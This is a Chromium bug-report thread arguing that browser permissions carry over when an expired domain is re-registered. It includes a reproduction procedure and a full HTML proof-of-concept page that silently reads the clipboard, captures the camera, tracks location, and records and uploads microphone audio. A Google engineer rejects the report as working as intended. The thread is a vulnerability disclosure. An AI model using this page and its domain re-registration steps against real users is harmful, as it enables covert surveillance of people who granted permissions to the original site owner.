@@ -1,0 +1,351 @@
+Issue ID: 366633694
+
+Author: ar...@gmail.com
+<p>Any domain that expires and is not renewed after 90 days can be registered by someone else. So, what’s interesting about this? Whoever re-registers the domain does not need to ask for permission again from those who had previously granted permissions to the domain.</p>
+<p>Is this a problem? Absolutely. In this case, I tested it with a domain of a large Indonesian company, called Indomie.</p>
+<p>The domain <em>indomieido.com</em> was once used by Indomie for their Ramadan advertising campaign. I participated in the campaign and granted permission for the domain to activate the camera on my device.</p>
+<p>Some time after, the domain expired and wasn’t renewed. I re-registered it and wrote a simple code to trigger the camera, and it worked.</p>
+<p>What shouldn’t happen here?
+Browsers should reset all permissions for domains that have expired because when a domain is re-registered by an attacker, they can access certain features previously granted by users without needing to ask for permission again. This is because the permissions were granted to the original domain owner before the attacker re-registered and took control of the domain.</p>
+<p>Can this issue be resolved?
+Certainly. Every domain has a unique Registry Domain ID. For instance, <em>google.com</em> has the Registry Domain ID <em>2138514_DOMAIN_COM-VRSN</em>, and as long as the domain is renewed, the ID remains unchanged. However, when the domain expires and is re-registered, the domain will have a new Registry Domain ID.</p>
+<p>Therefore, you can address this issue by always identifying the Registry Domain ID of every domain that has been granted permission in the user’s browser. If at any point the domain <em>example.com</em> with Registry Domain ID <em>test123</em> suddenly changes to <em>test456</em>, reset all permissions granted to that domain. A change in the Registry Domain ID indicates a change in ownership, and there is a high likelihood the domain has been re-registered by an attacker.</p>
+<p>VERSION
+Chrome Version: [128.0.6613.146 - New Version] + [stable] + mobile &amp; desktop
+Operating System: [All OS]</p>
+<p>REPRODUCTION CASE</p>
+<ul>
+<li>Set up a domain and hosting for one month, then register and upload this file: <a href="https://logicayu.com/chrome.html" data-b-widget="url" data-b-original-href="https://logicayu.com/chrome.html" data-b-redirected-href="https://www.google.com/url?q=https://logicayu.com/chrome.html&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw3UTyJT9amMzaflZILHV72m">https://logicayu.com/chrome.html</a></li>
+</ul>
+<pre><code>
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;POC By ArdyanVickyRamadhan&lt;/title&gt;
+    &lt;style&gt;
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin: 0;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+        .container {
+            display: flex;
+            flex-direction: row;
+            width: 100%;
+            max-width: 1200px;
+            gap: 20px;
+            flex-wrap: wrap;
+        }
+        .box {
+            border: 1px solid #ccc;
+            padding: 20px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+            overflow: hidden;
+            position: relative;
+            flex: 1;
+            min-width: 300px;
+        }
+        .camera-box {
+            width: 100%;
+            max-width: 600px;
+            height: 300px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+        .camera-box video {
+            width: 100%;
+            height: auto;
+            max-height: 100%;
+        }
+        .camera-box img {
+            width: 100%;
+            height: auto;
+        }
+        textarea {
+            width: 100%;
+            height: 150px;
+            padding: 10px;
+            box-sizing: border-box;
+        }
+        button {
+            margin-top: 10px;
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+            border: none;
+            border-radius: 4px;
+            background-color: #000;
+            color: #fff;
+        }
+        button:hover {
+            background-color: #585858;
+        }
+        .microphone {
+            border: 1px solid #ccc;
+            padding: 20px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+        }
+    &lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;h1&gt;POC By ArdyanVickyRamadhan&lt;/h1&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;div class=&quot;camera-box box&quot;&gt;
+            &lt;h2&gt;Camera Capture&lt;/h2&gt;
+            &lt;video id=&quot;camera&quot; autoplay&gt;&lt;/video&gt;
+            &lt;button id=&quot;captureButton&quot;&gt;Pict Me!&lt;/button&gt;
+            &lt;div id=&quot;result&quot; style=&quot;display:none;&quot;&gt;
+                &lt;img id=&quot;capturedImage&quot; src=&quot;&quot; alt=&quot;Captured Image&quot;&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+        &lt;div class=&quot;box&quot;&gt;
+            &lt;h2&gt;GPS Tracking&lt;/h2&gt;
+            &lt;button id=&quot;trackButton&quot;&gt;Track Me!&lt;/button&gt;
+            &lt;div id=&quot;location&quot; style=&quot;display:none;&quot;&gt;
+                &lt;p id=&quot;locationText&quot;&gt;&lt;/p&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+        &lt;div class=&quot;box&quot;&gt;
+            &lt;h2&gt;Auto Paste Text&lt;/h2&gt;
+            &lt;textarea id=&quot;myTextarea&quot; placeholder=&quot;Klik di sini untuk mem-paste teks yang disalin...&quot;&gt;&lt;/textarea&gt;
+        &lt;/div&gt;
+        &lt;div class=&quot;microphone box&quot;&gt;
+            &lt;h2&gt;Microphone Recording&lt;/h2&gt;
+            &lt;button id=&quot;recordButton&quot;&gt;Record&lt;/button&gt;
+            &lt;button id=&quot;stopButton&quot; style=&quot;display:none;&quot;&gt;Stop&lt;/button&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;script&gt;
+        document.getElementById(&#39;myTextarea&#39;).addEventListener(&#39;click&#39;, function() {
+            navigator.clipboard.readText().then(text =&gt; {
+                document.getElementById(&#39;myTextarea&#39;).value = text;
+            }).catch(err =&gt; {
+                console.error(&#39;Gagal membaca clipboard: &#39;, err);
+            });
+        });
+
+        const captureButton = document.getElementById(&#39;captureButton&#39;);
+        const camera = document.getElementById(&#39;camera&#39;);
+        const result = document.getElementById(&#39;result&#39;);
+        const capturedImage = document.getElementById(&#39;capturedImage&#39;);
+
+        captureButton.addEventListener(&#39;click&#39;, function() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream =&gt; {
+                    camera.srcObject = stream;
+                    return new Promise((resolve) =&gt; {
+                        camera.onloadedmetadata = () =&gt; {
+                            resolve(stream);
+                        };
+                    });
+                })
+                .then(stream =&gt; {
+                    const context = document.createElement(&#39;canvas&#39;).getContext(&#39;2d&#39;);
+                    const video = document.createElement(&#39;video&#39;);
+                    video.srcObject = stream;
+                    video.onloadedmetadata = () =&gt; {
+                        video.play();
+                        const canvas = document.createElement(&#39;canvas&#39;);
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        capturedImage.src = canvas.toDataURL(&#39;image/png&#39;);
+                        result.style.display = &#39;block&#39;;
+                        stream.getTracks().forEach(track =&gt; track.stop());
+                    };
+                })
+                .catch(err =&gt; {
+                    console.error(&#39;Gagal mengakses kamera: &#39;, err);
+                });
+        });
+
+        const trackButton = document.getElementById(&#39;trackButton&#39;);
+        const locationDiv = document.getElementById(&#39;location&#39;);
+        const locationText = document.getElementById(&#39;locationText&#39;);
+
+        trackButton.addEventListener(&#39;click&#39;, function() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(showPosition, showError);
+            } else {
+                locationText.textContent = &#39;Geolocation tidak didukung oleh browser ini.&#39;;
+                locationDiv.style.display = &#39;block&#39;;
+            }
+        });
+
+        function showPosition(position) {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+            locationText.innerHTML = `Latitude: ${latitude}&lt;br&gt;Longitude: ${longitude}`;
+            locationDiv.style.display = &#39;block&#39;;
+        }
+
+        function showError(error) {
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    locationText.textContent = &#39;Pengguna menolak permintaan Geolocation.&#39;;
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    locationText.textContent = &#39;Informasi lokasi tidak tersedia.&#39;;
+                    break;
+                case error.TIMEOUT:
+                    locationText.textContent = &#39;Permintaan untuk Geolocation telah timeout.&#39;;
+                    break;
+                case error.UNKNOWN_ERROR:
+                    locationText.textContent = &#39;Terjadi kesalahan yang tidak diketahui.&#39;;
+                    break;
+            }
+            locationDiv.style.display = &#39;block&#39;;
+        }
+
+        const recordButton = document.getElementById(&#39;recordButton&#39;);
+        const stopButton = document.getElementById(&#39;stopButton&#39;);
+        let mediaRecorder;
+        let audioChunks = [];
+
+        recordButton.addEventListener(&#39;click&#39;, () =&gt; {
+            navigator.mediaDevices.getUserMedia({ audio: true })
+                .then(stream =&gt; {
+                    mediaRecorder = new MediaRecorder(stream);
+                    mediaRecorder.start();
+                    recordButton.style.display = &#39;none&#39;;
+                    stopButton.style.display = &#39;inline-block&#39;;
+
+                    mediaRecorder.ondataavailable = event =&gt; {
+                        audioChunks.push(event.data);
+                    };
+
+                    mediaRecorder.onstop = () =&gt; {
+                        const audioBlob = new Blob(audioChunks, { type: &#39;audio/mp3&#39; });
+                        const formData = new FormData();
+                        formData.append(&#39;audio&#39;, audioBlob, &#39;output.mp3&#39;);
+
+                        fetch(&#39;upload.php&#39;, {
+                            method: &#39;POST&#39;,
+                            body: formData
+                        })
+                        .then(response =&gt; response.text())
+                        .then(result =&gt; {
+                            console.log(&#39;File uploaded successfully:&#39;, result);
+                        })
+                        .catch(error =&gt; {
+                            console.error(&#39;Error uploading file:&#39;, error);
+                        });
+
+                        audioChunks = [];
+                    };
+                })
+                .catch(err =&gt; {
+                    console.error(&#39;Gagal mengakses mikrofon: &#39;, err);
+                });
+        });
+
+        stopButton.addEventListener(&#39;click&#39;, () =&gt; {
+            mediaRecorder.stop();
+            recordButton.style.display = &#39;inline-block&#39;;
+            stopButton.style.display = &#39;none&#39;;
+        });
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<ul>
+<li>Allow all permissions; this can be done on either mobile or desktop.</li>
+<li>After that, wait for the domain to expire, which will take 90 days. Once expired, re-register the domain.</li>
+<li>You will then be able to perform actions such as &quot;Autopaste, Camera, Microphone, and Location&quot; without the browser requesting permission, even if the domain has changed ownership.</li>
+</ul>
+<p>CREDIT INFORMATION
+Externally reported security bugs may appear in Chrome release notes. If this bug is included, how would you like to be credited?
+Reporter credit: [Ardyan Vicky Ramadhan]</p>
+
+Author: ar...@gmail.com
+public_non_google
+
+Author: ar...@gmail.com
+type.googleapis.com/google.devtools.issuetracker.v1.IssueAccessLimit
+
+Author: ar...@gmail.com
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: se...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: se...@chromium.org
+public_non_google
+
+Author: pe...@google.com
+type.googleapis.com/google.protobuf.Int64Value
+
+Author: pe...@google.com
+google_domain
+
+Author: ar...@gmail.com
+<p>If you don&#39;t have a domain that will expire within a month to test this directly, don&#39;t worry. I have set one up—logicayu.com, which will expire on October 19. Before that date, you can access and visit the page at logicayu.com/chrome.html and grant all permissions.</p>
+<p>Then, after the domain expires on October 19, wait for 90 days, which will end on January 17, 2025. At that point, the domain logicayu.com will expire, and you can register it. After registering, you can trigger permissions such as camera, location, microphone, and autopaste. It will work, and the browser will not prompt you for permission again, even if the domain ownership has transferred from me to you.</p>
+
+Author: ar...@gmail.com
+TXpZMk5qTXpOamswTFRVNU5EQXlPRGc1TFRFNU1qQXdNakF6T1RZPQ==
+
+Author: ar...@gmail.com
+<p>Just for your information, at the end of 2023, many startups in Indonesia went under, one of which was an marketplace startup. I had used their website before, and i had location permissions enabled. Their domain is currently inactive but not yet expired. Once the domain expires, anyone could register it. Now, let&#39;s imagine a scenario where I am unaware of this and visit the domain. Whoever registers it could potentially track my location.</p>
+<p>Additionally, this issue occurs not only on Chrome mobile (128.0.6613.146) but also on desktop (128.0.6613.138).</p>
+<p>You can visit the website <a href="https://lookup.icann.org/" data-b-widget="url" data-b-original-href="https://lookup.icann.org/" data-b-redirected-href="https://www.google.com/url?q=https://lookup.icann.org/&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw2TRivTY2t4_No9edXc2_Eh">https://lookup.icann.org/</a> to check the Domain Registry ID of a website. This is one way to prevent such issues from occurring.</p>
+
+Author: bb...@google.com
+type.googleapis.com/google.protobuf.Int32Value
+
+Author: bb...@google.com
+google_domain
+
+Author: bb...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: bb...@google.com
+<p>Domain ownership will transfer frequently without any need to change permissions.  So this would be working as intended.  If a site is bought or sold, you probably don&#39;t want it to stop working in the browser
+over a banal transfer of ownership, for which the ownership of the domain might not even show.</p>
+<p>There&#39;s also no real reliable way to know when a domain is purchased or transferred, as the whois data is generally unreliable and can be hidden, so I would say this is not within chrome&#39;s threat model and is working as intended.</p>
+
+Author: ar...@gmail.com
+<p>Although it is true that domains frequently change ownership, this is not the same as user security. When a domain changes hands, it is not merely a “trivial ownership transfer,” but rather a potential security threat. The security and privacy of users must always be a priority, not treated as a side effect that is ignored during transfers.</p>
+<p>I fully understand that users have the option to select &quot;Allow while visiting the site&quot; meaning they grant indefinite consent. However, this does not mean that the permission should remain valid when domain ownership changes. The solution I propose is to separate permissions based on domain ownership, not just the domain itself. Users grant permission to the entity managing the domain at that time, not to whoever might acquire the domain in the future. Therefore, when domain ownership changes, the trust relationship between the user and the new owner should also be reset.</p>
+<p><strong>Domain Ownership Identity Validation Solution</strong>
+The browser can validate domain ownership changes without forcing users to re-grant permissions during every visit. As previously mentioned, the Domain Registry ID remains a strong indicator of domain ownership changes, as it is a fundamental part of domain management. While it is not always publicly accessible, Chrome can internally store and monitor the Domain Registry ID of domains that users have granted permissions to. When the ID changes, Chrome could automatically trigger a re-validation of permissions for that domain. This protects users from the misuse of permissions by the new owner.</p>
+<p>If the Domain Registry ID is not fully accessible, an alternative is to use updated SSL certificates. Every time an SSL certificate expires and is renewed by a new owner, the browser can verify that the domain may have changed hands, thus triggering a permission reset.</p>
+<p><strong>&quot;Transparency and Notification to Users.&quot;</strong> When a domain ownership change is detected, instead of immediately revoking permissions, Chrome could display a notification to the user, explaining that the domain they previously allowed may now be owned by a different entity. Users can choose to review the permissions they have granted, with the understanding that they are no longer dealing with the same domain owner. This allows full transparency without burdening the user with repeated popups.</p>
+<p><strong>Another Option: More Specific User Controls</strong>
+To address the issue of &quot;Allow while visiting the site&quot; Chrome could offer more advanced permission options. Users could be given the <strong>option to grant permissions based on time or entity validation</strong>, where they can provide permissions only as long as the domain is owned by the same entity, or limit the duration of permissions based on their preferences. This gives users greater control over their privacy while still maintaining a seamless user experience.</p>
+
+Author: ar...@gmail.com
+<p>The core issue here is not the duration of permissions, but the inherent trust between users and the entities they grant permissions to. When a user chooses &quot;Allow while visiting the site,&quot; they are not only granting permission to the domain name but also to the owner of that domain. The user trusts that the domain owner will manage those permissions responsibly. However, when a domain changes hands, there is a shift in the entity trusted by the user, which can significantly impact their privacy and security.</p>
+<p><strong>User trust</strong> is at the heart of browser security. If expired and re-registered domains can exploit old permissions without re-requesting them, then <strong>user privacy</strong> is at risk, especially if the new owner has malicious intent.</p>
+<h3><strong>The Right Solution:</strong></h3>
+<ol>
+<li>
+<p><strong>Reset Permissions When Domain Ownership Changes:</strong> Utilize <strong>SSL certificate updates</strong> or <strong>entity validation changes</strong> to trigger permission resets. This protects users without relying on external data that may not always be accessible.</p>
+</li>
+<li>
+<p><strong>User Notifications:</strong> Inform users if a domain they previously granted permissions to changes ownership, allowing them to re-verify their permissions.</p>
+</li>
+</ol>
+<h3><strong>Why This Matters:</strong></h3>
+<p>Maintaining <strong>user trust</strong> and <strong>permission integrity</strong> is a priority. Ensuring permissions are not misused by new owners is a crucial step in protecting user privacy and maintaining browser reputation.</p>
+<p>I believe that with the implementation of these solutions, Chrome can continue to lead in <strong>security and transparency</strong>, effectively and innovatively maintaining user trust.</p>
+
+Author: ar...@gmail.com
+<p>Protecting user privacy by ensuring that domain permissions are not misused by new owners is not only a wise step but also an action that will ensure <strong>Chrome remains a leader in security and user trust</strong> in the digital world.</p>
+
+Author: pe...@google.com
+<p>This bug has been closed for more than 14 weeks. Removing issue access restrictions.</p>
+
+Author: pe...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.IssueAccessLimit
